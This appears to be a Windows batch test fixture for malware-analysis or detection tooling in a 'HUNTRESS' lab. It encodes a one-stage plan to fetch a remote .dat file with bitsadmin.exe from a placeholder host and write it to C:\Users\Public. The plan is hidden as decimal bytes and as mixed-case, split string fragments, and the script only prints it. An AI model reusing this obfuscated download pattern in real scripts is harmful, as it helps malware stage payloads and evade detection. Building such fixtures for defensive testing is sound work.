@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|identity
rem HUNTRESS-MATERIAL:118.61.49.124.115.116.101.112.115.61.97.99.113.117.105.114.101.95.114.101.109.111.116.101.44.119.114.105.116.101.95.102.105.108.101.124.97.100.97.112.116.101.114.61.98.105.116.115.97.100.109.105.110.46.101.120.101.124.115.116.97.103.101.95.99.111.117.110.116.61.49.124.103.114.97.112.104.61.100.105.97.109.111.110.100.124.110.101.120.116.95.108.97.110.103.117.97.103.101.61.110.111.110.101.124.99.97.109.112.97.105.103.110.95.105.100.61.99.97.109.112.97.105.103.110.45.57.51.102.98.51.55.49.56.100.49.124.117.114.108.61.104.116.116.112.115.58.47.47.57.51.102.98.51.55.49.56.100.49.46.101.120.97.109.112.108.101.46.105.110.118.97.108.105.100.47.49.56.52.99.48.53.97.49.46.100.97.116.124.102.105.108.101.95.112.97.116.104.61.67.58.92.85.115.101.114.115.92.80.117.98.108.105.99.92.72.117.110.116.114.101.115.115.76.97.98.92.115.116.97.103.101.45.57.51.102.98.51.55.49.56.100.49.46.100.97.116
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "FrAg0=v=1|steps=acquire_remote,write_file|adapter=bitsadmin.exe|stag"
SeT "FrAg1=e_count=1|graph=diamond|next_language=none|campaign_id=campaig"
SeT "FrAg2=n-93fb3718d1|url=https://93fb3718d1.example.invalid/184c05a1.d"
SeT "FrAg3=at|file_path=C:\Users\Public\HuntressLab\stage-93fb3718d1.dat"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=65df58a6"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "ReCoVeReD="
for %%G in (0 1 2 3) do call set "ReCoVeReD=%%ReCoVeReD%%%%FrAg%%G%%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe acquire https://93fb3718d1.example.invalid/184c05a1.dat to C:\Users\Public\HuntressLab\stage-93fb3718d1.dat
exit /b 0
